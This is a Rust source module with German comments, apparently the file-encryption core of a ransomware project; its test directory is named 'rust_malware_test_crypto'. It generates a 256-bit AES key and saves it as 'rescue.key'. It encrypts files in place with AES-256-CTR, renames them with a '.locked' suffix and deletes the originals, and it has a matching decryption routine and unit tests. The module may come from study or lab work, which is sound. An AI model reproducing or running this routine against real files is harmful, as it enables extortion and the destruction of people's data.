use crate::utils;
use aes::cipher::{KeyIvInit, StreamCipher};
use anyhow::{Context, Result};
use rand::{Rng, rng};
use std::fs::{self, File};
use std::io::{BufReader, BufWriter, Read, Write};
use std::path::Path;

// Typ-Alias für AES-256 im CTR-Modus
type Aes256Ctr = ctr::Ctr64BE<aes::Aes256>;

/// Generiert einen symmetrischen 256-Bit-Schlüssel.
///
/// Args:
/// - keine
///
/// Returns:
/// - Ok([u8; 32]): zufällig generierter Schlüssel (32 Byte)
/// - Err(anyhow::Error): Fehler bei der Zufallszahlengenerierung
pub fn generate_key() -> Result<[u8; 32]> {
    let mut key = [0u8; 32];
    rng().fill(&mut key);

    Ok(key)
}

/// Speichert einen 256-Bit-Schlüssel als Datei `rescue.key`.
///
/// Args:
/// - base_path: Basisverzeichnis für die Schlüsseldatei
/// - key: Referenz auf den zu speichernden Schlüssel
///
/// Returns:
/// - Ok(()): Schlüssel erfolgreich gespeichert
/// - Err(anyhow::Error): Schreib- oder Pfadfehler
pub fn save_key(base_path: &Path, key: &[u8; 32]) -> Result<()> {
    let key_path = base_path.join("rescue.key");

    fs::write(&key_path, &key)
        .with_context(|| format!("Fehler beim Schreiben der Schlüsseldatei: {:?}", key_path))?;

    Ok(())
}

/// Generiert einen kryptographisch sicheren 256-Bit Schlüssel und speichert diesen.
///
/// # Arguments
/// * `base_path` - Verzeichnis, in dem die Schlüsseldatei `rescue.key` abgelegt wird.
///
/// # Returns
/// Gibt den 32-Byte Schlüssel zurück.
pub fn generate_and_save_key(base_path: &Path) -> Result<[u8; 32]> {
    let mut key = [0u8; 32];
    rng().fill(&mut key);

    let key_path = base_path.join("rescue.key");

    fs::write(&key_path, &key)
        .with_context(|| format!("Fehler beim Schreiben der Schlüsseldatei: {:?}", key_path))?;

    Ok(key)
}

/// Verschlüsselt eine Datei mit AES-256-CTR.
///
/// Die Datei wird stückweise (streaming) gelesen, verschlüsselt und in eine temporäre Datei geschrieben.
/// Nach erfolgreichem Abschluss wird die Originaldatei durch die verschlüsselte Version ersetzt (atomare Operation).
///
/// # Arguments
/// * `path` - Pfad zur zu verschlüsselnden Datei.
/// * `key` - Der 32-Byte AES-Schlüssel.
/// * `iv` - Der 16-Byte Initialisierungsvektor.
pub fn encrypt_file_atomic(path: &Path, key: &[u8; 32], iv: &[u8; 16]) -> Result<()> {
    let input_file = File::open(path).context("Konnte Eingabedatei nicht öffnen")?;
    let mut reader = BufReader::new(input_file);

    let mut temp_filename = path.file_name().unwrap().to_os_string();
    temp_filename.push(".enc_temp");
    let temp_path = path.with_file_name(temp_filename);

    let output_file = File::create(&temp_path).context("Konnte temporäre Datei nicht erstellen")?;
    let mut writer = BufWriter::new(output_file);

    let mut cipher = Aes256Ctr::new(key.into(), iv.into());
    let mut buffer = [0u8; 4096];

    loop {
        let count = reader.read(&mut buffer)?;
        if count == 0 {
            break;
        }
        let chunk = &mut buffer[..count];
        cipher.apply_keystream(chunk);
        writer.write_all(chunk)?;
    }

    writer.flush()?;

    // Wichtig: Reader und Writer droppen, um File-Handles freizugeben, bevor umbenannt wird (besonders wichtig unter Windows)
    drop(reader);
    drop(writer);

    let mut locked_filename = path.file_name().unwrap().to_os_string();
    locked_filename.push(".locked");
    let locked_path = path.with_file_name(locked_filename);

    fs::rename(&temp_path, &locked_path).context("Fehler beim ersetzen der Datei")?;

    // Versuchen, die Originaldatei zu löschen, falls rename nicht implizit löscht (Systemabhängig),
    // meistens reicht rename, aber falls die temp Datei woanders lag:
    if path.exists() {
        let _ = fs::remove_file(path);
    }

    Ok(())
}

/// Entschlüsselt eine .locked Datei und stellt das Original wieder her.
///
/// # Arguments
/// * `path`- Pfad zur verschlüsselten Datei (muss auf .locked enden).
/// * `key` - Der AES-Schlüssel aus der rescue.key Datei.
/// * `iv` - Der Initialisierungsvektor (muss identisch zu dem bei der verschlüsselung verwendeten
/// sein
pub fn decrypt_file_atomic(path: &Path, key: &[u8; 32], iv: &[u8; 16]) -> Result<()> {
    // Checken ob es sich um eine .locked Datei handelt
    if path.extension().and_then(|e| e.to_str()) != Some("locked") {
        // Nicht verschlüsselte Datei ignorieren
        return Ok(());
    }

    // Zielpfad bestimmen (Endung .locked entfernen)
    let original_path = path.with_extension("");
    let input_file = File::open(path).context("Konnte .locked Datei nicht öffnen")?;
    let mut reader = BufReader::new(input_file);

    // Zunächst in temp-Datei
    let temp_path = original_path.with_extension("dec_temp");
    let output_file = File::create(&temp_path).context("Zieldatei konnte nicht erstellt werden")?;
    let mut writer = BufWriter::new(output_file);

    // Bei AES: Entschlüsselung mathematisch identisch zur Verschlüsselung
    let mut cipher = Aes256Ctr::new(key.into(), iv.into());
    let mut buffer = [0u8; 4096];

    loop {
        let count = reader.read(&mut buffer)?;
        if count == 0 {
            break;
        }

        let chunk = &mut buffer[..count];
        // XOR ist umkehrbar -> gleicher aufruf
        cipher.apply_keystream(chunk);
        writer.write_all(chunk)?;
    }

    writer.flush()?;
    drop(reader);
    drop(writer);

    // Datei umbenennen (Temp -> Original)
    fs::rename(&temp_path, &original_path)
        .context("Fehler beim Wiederherstellen der ursprünglichen Datei")?;

    // Locked Datei löschen
    if path.exists() {
        let _ = fs::remove_file(path);
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::env;

    // erstellt ein temporäres verzeichnis
    fn get_temp_dir() -> std::path::PathBuf {
        let mut dir = env::temp_dir();
        dir.push(format!(
            "rust_malware_test_crypto_{}",
            rand::random::<u32>()
        ));
        let _ = fs::create_dir(&dir);
        dir
    }

    // löscht ein verzeichnis rekursiv
    fn cleanup_dir(path: &Path) {
        let _ = fs::remove_dir_all(path);
    }

    #[test]
    fn test_key_generation() {
        let temp_dir = get_temp_dir();
        let key = generate_and_save_key(&temp_dir).expect("KeyGen failed");

        // Länge des Keys prüfen
        assert_eq!(key.len(), 32);

        // Prüfen, ob die Datei existiert
        let key_file = temp_dir.join("rescue.key");
        assert!(key_file.exists());

        // Prüfen, ob Dateiinhalt mit Return-Wert übereinstimmt
        let file_content = fs::read(&key_file).unwrap();
        assert_eq!(file_content, key);

        cleanup_dir(&temp_dir);
    }

    #[test]
    fn test_encryption_decryption_cycle() {
        let temp_dir = get_temp_dir();
        let original_file = temp_dir.join("secret_data.txt");
        let locked_file = temp_dir.join("secret_data.txt.locked");

        let original_content = b"Dies ist ein geheimer Text mit 12345.";

        // Datei erstellen
        fs::write(&original_file, original_content).unwrap();

        // Key & IV
        let key = generate_and_save_key(&temp_dir).unwrap();
        let iv = [0u8; 16]; // Statischer IV für Test

        // Verschlüsseln
        encrypt_file_atomic(&original_file, &key, &iv).expect("Encryption failed");

        // Prüfen, ob das orginial weg ist und eine verschlüsselte Datei existiert
        assert!(
            !original_file.exists(),
            "Originaldatei sollte gelöscht sein"
        );
        assert!(locked_file.exists(), ".locked Datei sollte existieren");

        // Prüfen, ob der Inhalt verschlüsselt ist
        let encrypted_content = fs::read(&locked_file).unwrap();
        assert_ne!(
            encrypted_content, original_content,
            "Daten wurden nicht verschlüsselt!"
        );

        // Inhalt entschlüsseln
        decrypt_file_atomic(&locked_file, &key, &iv).expect("Decryption failed");

        // Prüfen, ob Lock nicht mehr da und ursprügnliche Datei wieder da
        assert!(!locked_file.exists(), ".locked Datei sollte gelöscht sein");
        assert!(
            original_file.exists(),
            "Originaldatei sollte wiederhergestellt sein"
        );

        // Püfen, ob der inhalt identisch ist
        let restored_content = fs::read(&original_file).unwrap();
        assert_eq!(
            restored_content, original_content,
            "Datenintegrität verletzt!"
        );

        cleanup_dir(&temp_dir);
    }

    #[test]
    fn test_decrypt_ignores_non_locked_files() {
        let temp_dir = get_temp_dir();
        let normal_file = temp_dir.join("normal.txt");
        fs::write(&normal_file, "Ich bin normal").unwrap();

        let key = [0u8; 32];
        let iv = [0u8; 16];

        // Versuch, normale Datei zu entschlüsseln
        let result = decrypt_file_atomic(&normal_file, &key, &iv);

        assert!(result.is_ok(), "Sollte keinen Fehler werfen");
        assert!(normal_file.exists(), "Datei sollte noch da sein");

        let content = fs::read_to_string(&normal_file).unwrap();
        assert_eq!(
            content, "Ich bin normal",
            "Inhalt sollte unverändert bleiben"
        );

        cleanup_dir(&temp_dir);
    }
}
